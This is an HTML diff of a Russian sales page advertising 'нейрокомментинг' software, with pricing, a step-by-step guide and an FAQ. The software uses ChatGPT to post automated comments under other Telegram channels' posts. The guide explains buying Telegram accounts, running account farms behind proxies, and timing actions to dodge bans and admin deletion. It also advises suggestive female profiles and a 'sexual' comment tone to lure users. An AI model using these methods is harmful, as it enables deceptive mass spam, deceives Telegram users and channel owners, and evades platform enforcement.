+<li>Возможность указать свои промты</li>
+<li>Возможность настроить тон комментария, к примеру "сексуальный"</li>
+<li>Бесплатные обновления</li>
+  </ol> 
+  <p style="margin-bottom: 10px; text-align: left;">❌ <b>Парсер каналов с открытыми комментариями</b></p>   
+  <p style="text-align: left;">❌ <b>Автоконвертер аккаунтов</b></p>   
+</div>
+      <div style="width: 232px; margin: 0 auto;">
+
+ <div class="cdbd-btn br-10 btn-large position-relative flex justify-center align-center overflow-hidden">
+                <a href="https://t.me/grayschemebot?start=neirokom1m" target="_blank" class="btn fw-700 fz-16 position-relative cl-white">
+                  
+                  <span>1 месяц 20$</span>
+                </a>
+              </div>
+
+        <div style="margin-bottom: 25px;" class="cdbd-btn br-10 btn-large position-relative flex justify-center align-center overflow-hidden">
+                <a href="https://t.me/grayschemebot?start=neirokom1y" target="_blank" class="btn fw-700 fz-16 position-relative cl-white">
+                  
+                  <span>1 год 45$</span>
+                </a>
+              </div></div>
+           
+            </div>
+       <div class="br-14"  style="max-width: 320px; margin: 0 auto;     margin: 50px auto; min-height: 762px;    background: #1B1B21; padding: 10px;"> 
+
+
+        <div style="color: white; font-family: 'Montserrat', sans-serif; ">
+      
+   
+
+      </div>
+     
+            <h3 style="    color: white;
+    text-align: center;
+    font-size: 30px; margin: 2px">🔥 Купить ПАК</h3>
+
+<div class="p20">
+<p style="text-align: left;">✅ <b>Нейрокомментиг</b></p>   
+<ol style="margin-bottom: 10px; text-align: left;">      
+<li>Инструкция по работе</li>
+<li>Работает на основе ChatGpt</li>
+<li>Поддержка мультиаккаунтинга</li>
+<li>Настройка прокси</li>
+<li>Настройки задержек</li>
+<li>Возможность указать свои промты</li>
+<li>Возможность настроить тон комментария, к примеру "сексуальный"</li>
+<li>Бесплатные обновления</li>
+  </ol> 
+  <p style="margin-bottom: 10px; text-align: left;" >✅ <b>Парсер каналов с открытыми комментариями</b></p>   
+  <p text-align: left;>✅ <b>Автоконвертер аккаунтов</b></p>   
+</div>
+
+
+      <div style="width: 232px; margin: 0 auto;">
+
+ <div class="cdbd-btn br-10 btn-large position-relative flex justify-center align-center overflow-hidden">
+                <a target="_blank" href="https://t.me/grayschemebot?start=pakneirokom1m" class="btn fw-700 fz-16 position-relative cl-white">
+                  
+                  <span>1 месяц 30$</span>
+                </a>
+              </div>
+
+        <div style="margin-bottom: 25px;" class="cdbd-btn br-10 btn-large position-relative flex justify-center align-center overflow-hidden">
+                <a target="_blank" href="https://t.me/grayschemebot?start=pakneirokom1y" class="btn fw-700 fz-16 position-relative cl-white">
+                  
+                  <span>1 год 70$</span>
+                </a>
+              </div></div>
+            </div>
+
+
+          </div>
+
+
+
+        </div>
+      </div>
+    </div>
+    <!-- exclusive-bundles-End -->
+
+
+<div class="exclusive-bundles exclusive-bundles2">
+  <div class="cdbd-container mw1280">
+    <div class="content-block">
+      <div class="content-inner-right nml">
+        <div class="content-inner-content">
+          <h2 class="line-border position-relative fw-600 fz-52 lh-72 cl-white fs25" style="text-align: center;">Как раскрутить Телеграм через Нейрокомментинг?
+            <svg xmlns="http://www.w3.org/2000/svg" width="271" height="39" class="position-absolute" viewBox="0 0 271 39" fill="none">
+              <path d="M2 37C72.3195 13.3049 207.89 -14.3698 269 14.0643" stroke="url(#paint0_linear_784_134)" stroke-width="4" stroke-linecap="round"></path>
+              <defs>
+                <linearGradient id="paint0_linear_784_134" x1="25.6855" y1="2" x2="87.2489" y2="126.717" gradientUnits="userSpaceOnUse">
+                  <stop offset="1" stop-color="#438A54"></stop>
+                  <stop offset="1" stop-color="#1F868D"></stop>
+                </linearGradient>
+              </defs>
+            </svg>
+          </h2>
+          <div class="expandable-text-wrapper">
+<div class="article-content">
+  <p>В этой статье мы расскажем о методе «нейрокомментирования», который позволяет увеличивать аудиторию <strong>Telegram-канала</strong>, используя автоматические комментарии, соответствующие новым постам на каналах конкурентов. С помощью <strong>ChatGPT</strong> и специального скрипта трафик перенаправляется на ваш канал, что помогает достичь более<strong> 10,000 подписчиков.</strong></p>
+
+  <h3>Что такое нейрокомментирование?</h3>
+  <p>Комментинг с искусственным интеллектом - это метод привлечения подписчиков, который автоматически публикует осмысленные комментарии под новыми постами в других <strong>Telegram-каналах</strong>. Боты пишут комментарии, соответствующие тематике поста, таким образом органично встраиваясь в обсуждение. Суть работы заключается в использовании скрипта, который отслеживает обновления в выбранных каналах, затем обрабатывает их в <strong>ChatGPT</strong> и генерирует комментарии. Эти комментарии публикуются от имени аккаунтов, привлекая интерес к вашему каналу.</p>
+
+  <h3>Подготовка аккаунтов для нейрокомментинга</h3>
+  <p>Первый этап настройки нейрокомментинга — приобретение аккаунтов, которые не были взломаны и самостоятельно зарегистрированы. Для этого можно воспользоваться ресурсом <strong>LZT Market</strong>, где можно выбрать качественные <strong>Telegram-аккаунты</strong> с минимальными ограничениями.</p>
+  <center><img src="/assets/imgs/article/01.webp" alt="Пример покупки аккаунта"></center>
+
+  <p>Затем выбираем аккаунт без спам блока и нажимаем купить.</p>
+  <center><img src="/assets/imgs/article/02.webp" alt="Выбор аккаунта без спам блока"></center>
+
+  <p>После покупки выбираем TData.</p>
+  <center><img src="/assets/imgs/article/03.webp" alt="Выбор TData"></center>
+
+  <p>Затем рядом с папкой TData кладем <strong>telegram.exe (porable версии)</strong> и входим в аккаунт.</p>
+  <center><img src="/assets/imgs/article/04.webp" alt="Перенос TData в telegram.exe"></center>
+
+  <p>На таких аккаунтах создаются профили:</p>
+  <center><img src="/assets/imgs/article/05.webp" alt="Создание профилей на аккаунтах"></center>
+
+  <p>На примере аккаунта выбрано более скромное фото, но для привлечения внимания лучше использовать более открытое фото, чтобы пользователи захотели перейти на ваш профиль и в конечном итоге подписаться на канал.</p>
+
+  <h3>Настройка промта</h3>
+  <p>Чтобы скрипт понимал особенности вашего канала и писал соответствующие комментарии, нужно задать параметры для <strong>ChatGPT</strong> в специальном файле <strong>prompts.txt</strong>.</p>
+  <center><img src="/assets/imgs/article/promts.jpg" alt="Файл prompts.txt для настройки ChatGPT"></center>
+
+  <p><strong>Создаем промт</strong></p>
+  <center><img src="/assets/imgs/article/2.webp" alt="Создание промта"></center>
+
+  <p>Затем добавляем описание промта:</p>
+    <center><img src="/assets/imgs/article/3.webp" alt="Описание промта"></center>
+
+  <p>После указываем подтекст, с которым ChatGPT будет писать сообщения:</p>
+  <center><img src="/assets/imgs/article/4.webp" alt="Настройка подтекста для ChatGPT"></center>
+  <p>В нашем случае подтекст — сексуальный, что помогает <strong>ChatGPT</strong> адаптироваться к стилистике канала и генерировать привлекательные комментарии.</p>
+
+  <h3>Поиск каналов с открытыми комментариями</h3>
+  <p>Для эффективного распространения комментариев необходимо найти каналы с открытыми комментариями. Это можно делать вручную или с помощью специализированного софта. В файле <strong>config.yaml</strong> прописываются ключевые слова для поиска, например, «авто», «рыбалка», «мото».</p>
+  <center><img src="/assets/imgs/article/5.webp" alt="Настройка config.yaml"></center>
+  <p>Прописываются ключевые слова для поиска, например, «авто», «рыбалка», «мото».</p>
+  <center><img src="/assets/imgs/article/6.webp" alt="Ключевые слова для парсинга"></center>
+
+  <p>Чем больше релевантных каналов будет найдено, тем выше вероятность привлечения нужной аудитории.</p>
+
+  <p>Далее заходим в файл <strong>main.exe</strong> и запускаем скрипт для парсинга.</p>
+  <center><img src="/assets/imgs/article/7.webp" alt="Запуск main.exe"></center>
+  <p>После чего скрипт начинает тот самый парсинг</p>
+  <center><img src="/assets/imgs/article/8.webp" alt="Парсинг Телеграм каналов"></center>
+
+  <p>После завершения парсинга результат сохраняется в <strong>result.yaml</strong>.</p>
+  <center><img src="/assets/imgs/article/9.webp" alt="Файл result.yaml с результатом парсинга"></center>
+  <p>Мы видим результат роботы,который нам нужно скопировать и записать себе в блокнот.</p>
+  <center><img src="/assets/imgs/article/10.webp" alt="парсер каналов"></center>
+
+  <h3>Настройка задержек</h3>
+  <p>Настройка задержек для подписки и отправки комментариев важна для предотвращения моментального удаления комментариев админами каналов и для снижения риска блокировок. Интервалы в несколько секунд между действиями помогают выглядеть более естественно.</p>
+  <center><img src="/assets/imgs/article/11.webp" alt="Настройка автоматизации"></center>
+<p>Интервалы в несколько секунд между действиями помогают избежать блокировок и выглядеть естественно. </p>
+  <center><img src="/assets/imgs/article/12.webp" alt="Пример задержки между действиями" title="Настройки задержек для скрипта"></center>
+
+  <h3>Создание фермы для аккаунтов</h3>
+  <p>Для повышения эффективности можно использовать несколько аккаунтов и прокси-серверы. На каждый скрипт добавляется 3-4 аккаунта с одного IP. Это позволяет создать ферму для привлечения большего количества подписчиков.</p>
+  <center><img src="/assets/imgs/article/13.webp" alt="Создание фермы аккаунтов"></center>
+
+  <p>Важно для каждой новой папки использовать новый прокси, чтобы избежать бана аккаунтов.</p>
+  <center><img src="/assets/imgs/article/14.webp" alt="Настройка прокси для фермы аккаунтов"></center>
+
+  <p>Выбираем прокси-сервис, соответствующий стране аккаунта, и указываем нужные параметры.</p>
+  <center><img src="/assets/imgs/article/15.webp" alt="Покупка прокси для аккаунтов"></center>
+<p>Заходим в скрипте в файл Прокси</p>
+  <center><img src="/assets/imgs/article/16.webp" alt="Настройка прокси"></center>
+<p>Сохраняем но если мы будем работать всего лишь с тремя четырьмя аккаунтами на ранней стадий то прокси можно оставить там пустым тогда будет использован ваш IP на компьютере</p>
+  <h3>Добавление аккаунтов</h3>
+  <p>Затем необходимо добавить аккаунты в формате сессии. Это позволяет сохранить сессию и обеспечить стабильное подключение.</p>
+  <center><img src="/assets/imgs/article/17.webp" alt="Добавление аккаунтов в формате сессии"></center>
+  <h3>Запуск программы для нейрокомментинга</h3>
+  <p>По прошлому принципу запускаем софт, а именно <strong>main.exe</strong> и софт начинает работать с теми параметрами что мы указали:</p>
+  <center><img src="/assets/imgs/article/18.webp" alt="Инструкция по защите аккаунта"></center>
+  <h3>Защита аккаунтов</h3>
+  <p>Чтобы продавец аккаунта не смог его украсть, важно обеспечить защиту. На моем канале <a style="color: #009dff;" href="https://t.me/+QZVWGg0Ypg1mMTYy" target="_blank"><strong>Cерая Cхема</strong></a> есть инструкция по защите Telegram аккаунта после покупки.</p>
+  <center><img src="/assets/imgs/article/99.webp" alt="Продвижение через нейрокомментинг"></center>
+  <h3>Результат работы</h3>
+   <p>Для стабильного роста подписчиков создаются фермы аккаунтов. В рамках эксперимента, запустив ферму из 15 аккаунтов на 4-5 часов, удалось привлечь около 16 подписчиков. В масштабах большого канала это способно приносить значительные результаты — от 300 до 1000 подписчиков в день.</p>
+  <center><img src="/assets/imgs/article/16sub.webp" alt="результат нейрокомментинга"></center>
+  <h3>Итог</h3>
+  <p><strong>Искусственный интеллект для комментирования</strong> — это эффективный метод продвижения <strong>Telegram-канала</strong> с помощью <strong>ChatGPT</strong> и автоматизированных скриптов. При правильной настройке фермы аккаунтов можно привлекать тысячи подписчиков в месяц, развивая канал и увеличивая доход от монетизации.</p>
+</div>
+          </div>
+       <div class="toggle-button" onclick="toggleText()">
+  <svg id="arrow-icon" xmlns="http://www.w3.org/2000/svg" width="76" height="32" fill="none" viewBox="0 0 36 12" stroke="url(#gradient)" stroke-width="1.5">
+    <defs>
+      <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="0%">
+        <stop offset="10.89%" stop-color="#438A54" />
+        <stop offset="91.99%" stop-color="#1F868D" />
+      </linearGradient>
+    </defs>
+    <path d="M3 3l15 6 15-6"></path>
+  </svg>
+</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  function toggleText() {
+    var textWrapper = document.querySelector(".expandable-text-wrapper");
+    var arrowIcon = document.getElementById("arrow-icon");
+
+    // Toggle expanded class to show/hide text and rotate arrow
+    textWrapper.classList.toggle("expanded");
+    arrowIcon.classList.toggle("rotated");
+  }
+</script>
+    <!-- FAQs start -->
+    <div class="faq-wrapper section-padding" id="faqs">
+      <div class="cdbd-container position-relative mw1280">
+        <h2 class="cl-white fw-600 fz-42 lh-60 text-center">FAQ</h2>
+        <div class="faq-accourdion-main grid g-gap-30" style="position: relative; z-index: 1;">  
+          <div class="faq-accordion-wrapper">
+            <a href="#" class="faq-accordion-heading position-relative fw-700 fz-26 lh-36 cl-white br-10 active">Подойдет ли нейро комментинг для бизнеса? <span class="position-absolute fw-900 fz-30 lh-42">‒</span></a>
+            <div class="faq-accordion-content position-relative fw-400 fz-26 lh-36 cl-BDBDBD" style="display: block;">
+              Да, наш сервис сервис нейрокомментинга тг, идеально подходит для бизнеса. Он повышает вовлеченность, улучшает взаимодействие с клиентами и экономит время, поддерживая активность бренда в соцсетях и мессенджерах.
+            </div>
+          </div>
+          <div class="faq-accordion-wrapper">
+            <a href="#" class="faq-accordion-heading position-relative fw-700 fz-26 lh-36 cl-white br-10">Какие выставлять настройка нейрокомментинга?<span class="position-absolute fw-900 fz-30 lh-42">‒</span></a>
+            <div class="faq-accordion-content position-relative fw-400 fz-26 lh-36 cl-BDBDBD" style="display: none;">
+              Следуйте инструкции из видео обзора и дополнительнй инструкции, которая приложена в архиве к скрипту.
+            </div>
+          </div>
+          <div class="faq-accordion-wrapper">
+            <a href="#" class="faq-accordion-heading position-relative fw-700 fz-26 lh-36 cl-white br-10">Как сделать нейро комментинг эффективнее?
+              <span class="position-absolute fw-900 fz-30 lh-42">‒</span></a>
+            <div class="faq-accordion-content position-relative fw-400 fz-26 lh-36 cl-BDBDBD" style="display: none;">
+              Сделайте вовлекающий профиль, лучше всего использовать аватарку и имя девушки, такой подход работает лучше в 90% тематик.
+            </div>
+          </div>
+          <div class="faq-accordion-wrapper">
+            <a href="#" class="faq-accordion-heading position-relative fw-700 fz-26 lh-36 cl-white br-10">Чем ваш софт лучше других сервисов?<span class="position-absolute fw-900 fz-30 lh-42">‒</span></a>
+            <div class="faq-accordion-content position-relative fw-400 fz-26 lh-36 cl-BDBDBD" style="display: none;">
+              Наш софт постоянно обновляетя, мы делаем искусственных ограничений пол количеству аккунтов, а самое главное, наши цены самые низкие на рынке.
+            </div>
+          </div>
+          <div class="faq-accordion-wrapper">
+            <a href="#" class="faq-accordion-heading position-relative fw-700 fz-26 lh-36 cl-white br-10">Как заказать услугу нейрокомментинга?<span class="position-absolute fw-900 fz-30 lh-42">‒</span></a>
+            <div class="faq-accordion-content position-relative fw-400 fz-26 lh-36 cl-BDBDBD" style="display: none;">
+              Мы не оказываем услуг, только продаём софт, так как основная задача этого способа продвижения - снизить цену за привлеченного подписчика, а заказ услуг, противоречит этой логике.
+            </div>
+          </div>
+          <div class="faq-accordion-wrapper">
+            <a href="#" class="faq-accordion-heading position-relative fw-700 fz-26 lh-36 cl-white br-10">Где прочитать отзывы клиентов?<span class="position-absolute fw-900 fz-30 lh-42">‒</span></a>
+            <div class="faq-accordion-content position-relative fw-400 fz-26 lh-36 cl-BDBDBD" style="display: none;">
+              В нашем <a target="_blank" href="https://t.me/+csLoi7P308ozODZi">Телеграм канале с отзывами</a> есть много отзывов от наших клиентов и учеников.
+            </div>
+          </div>
+          <div class="faq-accordion-wrapper">
+            <a href="#" class="faq-accordion-heading position-relative fw-700 fz-26 lh-36 cl-white br-10">Как софт создает комментарии ? <span class="position-absolute fw-900 fz-30 lh-42">‒</span></a>
+            <div class="faq-accordion-content position-relative fw-400 fz-26 lh-36 cl-BDBDBD" style="display: none;">
+              ChatGPT делает анализ поста и выдает комментарий на основании поста и промта, который вы указали в скрипте, таким образом генерируются автоматические комментарии Телеграм.
+            </div>
+          </div>
+          <div class="faq-accordion-wrapper">
+            <a href="#" class="faq-accordion-heading position-relative fw-700 fz-26 lh-36 cl-white br-10">Возможен ли нейрокомментинг в чатах?<span class="position-absolute fw-900 fz-30 lh-42">‒</span></a>
+            <div class="faq-accordion-content position-relative fw-400 fz-26 lh-36 cl-BDBDBD" style="display: none;">
+              Сообщения отправляются исключительно в комментарии под постами, но они так же попадают в чат, который привязан в канале. Если же вам нужен софт нейрочаттинг, тогда рекомендую написать нам в Телеграм и узнать о нём больше подробной информации.
+            </div>
+          </div>
+        </div>
+        <svg xmlns="http://www.w3.org/2000/svg" width="1244" height="1100" class="faq-svg position-absolute bottom-0 left-0" viewBox="0 0 1244 1795" fill="none">
+          <g filter="url(#filter0_f_799_741)">
+            <path d="M304.097 797.964C219.538 642.535 444.927 712.534 543.906 744.697L454.419 1094.53C319.472 1068.54 85.9658 976 107.014 937.544C160.941 839.014 379.779 937.079 304.097 797.964Z" fill="#46DB00"></path>
+          </g>
+          <defs>
+            <filter id="filter0_f_799_741" x="-594.317" y="0.846344" width="1838.22" height="1793.68" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
+              <feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood>
+              <feBlend mode="normal" in="SourceGraphic" in2="BackgroundImageFix" result="shape"></feBlend>
+              <feGaussianBlur stdDeviation="350" result="effect1_foregroundBlur_799_741"></feGaussianBlur>
+            </filter>
+          </defs>
+        </svg>
+      </div>
+    </div>
+
+    
+<div class="exclusive-bundles" style="margin-bottom: 100px">
+  <div class="cdbd-container mw1280">
+    <div class="content-block">
+      <div class="content-inner-right nml">
+        <div class="content-inner-content">
+          <p style="margin-bottom: 10px;text-align: center;" class="line-border position-relative fw-600 fz-52 lh-72 cl-white fs25" style="text-align: center;">Полезные статьи</p>
+          <div class="">
+            <ul style="color: white;  list-style-type: disc; padding-left: 20px; text-align: left;">
+              <li><a style="color: white; font-size: 18px;" href="/articles/kak-rabotaet-neyrokommenting-v-telegram/">Привлечение подписчиков в Telegram через автоматические комментарии</a></li>
+              <li><a style="color: white; font-size: 18px;" href="/articles/5-preimuschestv-neyrokommentinga/">5 преимуществ нейрокомментинга для бизнеса</a></li>
+              <li><a style="color: white; font-size: 18px;" href="/articles/top-5-oshibok-pri-ispolzovanii-neirokommentinga/">Топ-5 ошибок при использовании нейрокомментинга и как их избежать</a></li>
+              <li><a style="color: white; font-size: 18px;" href="/articles/neyrokommenting-v-telegram-gajd/">Как использовать Нейрокомментинг в Telegram для массовых продаж?</a></li>
+              <li><a style="color: white; font-size: 18px;" href="/articles/neurocommenting-telegram-kak-raskrutit-kanal-bistro/">Как раскрутить Телеграм канал быстро? ИЗИМАНИ 2025</a></li>
+              <li><a style="color: white; font-size: 18px;" href="/articles/neirokommenting-v-telegram-kak-rabotat-i-prodvinut-kanal/">Нейрокомментинг в Telegram: Как Работает и Как Продвинуть Канал с Помощью ИИ</a></li>
+              <li><a style="color: white; font-size: 18px;" href="/articles/skript-dlya-neyrokommentinga-telegram-2025/">Скрипт для Нейрокомментинга Телеграм 2025</a></li>
+              </ul>
+            </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div
+    <!-- FAQs end -->
+ <div class="bluelyap2"></div>
+    <!-- Start Footer section -->
+    <footer class="site-footer" >
+      <div class="cdbd-container position-relative mw1280">
+        <div class="widget-area grid grid-2">
+          <div class="widget">
+            <div class="footer-logo">
+              <a href="/">
+                <img src="assets/imgs/Logo.webp" alt="Логотип neirogram.com">
+              </a>
+            </div> 
+          </div>
+          <div class="widget-navs flex justify-between df2">
+            <div class="footer-navs">
+              <h4 class="widget-title fw-700 fz-20 lh-36 cl-white ">Проекты</h4>
+              <ul class="list-unstyled">
+                <li class="lh-40"><a target="_blank" rel="nofollow" href="https://t.me/GraySchemeBot" class="fw-400 fz-18 cl-white">Магазин</a></li>
+                <li class="lh-40"><a target="_blank" rel="nofollow" href="https://t.me/+XVwJqYeLE2IzMzcy" class="fw-400 fz-18 cl-white">Телеграм канал</a></li>
+                <li class="lh-40"><a target="_blank" rel="nofollow" href="https://youtube.com/@grayscheme" class="fw-400 fz-18 cl-white">Ютуб канал</a></li>
+                <li class="lh-40"><a target="_blank" href="https://grayscheme.com" class="fw-400 fz-18 cl-white">Схемы Заработка</a></li>
+              </ul>
+            </div>
+            <div class="footer-navs">
+              <h4 class="widget-title fw-700 fz-20 lh-36 cl-white namefoot">Контакты</h4>
+              <ul class="list-unstyled">
+                <li class="lh-40"><a target="_blank" rel="nofollow" href="https://t.me/bivenmo" class="fw-400 fz-18 cl-white">Телеграм</a></li>
+              </ul>
+            </div>
+            <div class="footer-navs">
+              <h4 class="widget-title fw-700 fz-20 lh-36 cl-white namefoot">Курсы</h4>
+              <ul class="list-unstyled">
+                <li class="lh-40"><a target="_blank" href="https://grayscheme.academy" class="fw-400 fz-18 cl-white">Курс по Телеграм</a></li>
+                <li class="lh-40"><a target="_blank" href="https://cashyou.tube" class="fw-400 fz-18 cl-white">Курс по Ютуб</a></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+    <!-- End footer -->
+  </div>
+  <!-- include the Jquery JS -->
+  <script src="https://neirogram.com/assets/js/jquery.min.js"></script>
+  <!-- include the Main JS -->
+  <script src="https://neirogram.com/assets/js/global.js"></script>
+  <style>.mw900 {width: 100% !imporant;}</style>
 </body>
 </html>
